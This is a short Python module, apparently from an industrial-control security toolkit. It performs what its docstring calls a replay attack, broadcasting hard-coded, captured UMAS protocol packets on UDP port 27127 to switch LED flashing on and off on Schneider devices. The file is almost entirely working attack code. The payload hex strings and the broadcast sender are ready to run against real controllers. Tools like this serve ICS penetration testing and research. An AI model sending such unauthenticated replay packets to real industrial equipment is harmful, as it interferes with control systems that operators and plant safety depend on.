"""Schneider LED flash replay attack.

Sends broadcast packets on UDP port 27127 to toggle
the LED state on Schneider devices. This is a replay
of captured UMAS protocol packets.
"""

from __future__ import annotations

import socket

from scadaver.core.network import NetworkInterface

DEST_PORT = 27127
DEFAULT_TIMEOUT = 1

# Replayed packets for LED toggle on/off
FLASH_ON = (
    "cc855b510803550f6f790d534755c614046d9e33"
    "6a75766cb9c2584080726e66f6732adc62475855"
    "5a4759"
)
FLASH_OFF = (
    "cc855b510803550f6f790d534755c614046d9e33"
    "6a75766cbac2584080726e66f6732adc63475855"
    "5a4759"
)


def flash_led(
    interface: NetworkInterface,
    action: str = "on",
) -> None:
    """Send a LED flash-on or flash-off replay packet.

    Args:
        interface: Local network interface.
        action: "on" to start flashing, "off" to stop.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(DEFAULT_TIMEOUT)
    sock.bind((interface.ip, 0))

    packet = FLASH_ON if action == "on" else FLASH_OFF
    sock.sendto(bytes.fromhex(packet), ("255.255.255.255", DEST_PORT))
    print(f"Sent LED {action} packet.")
    sock.close()
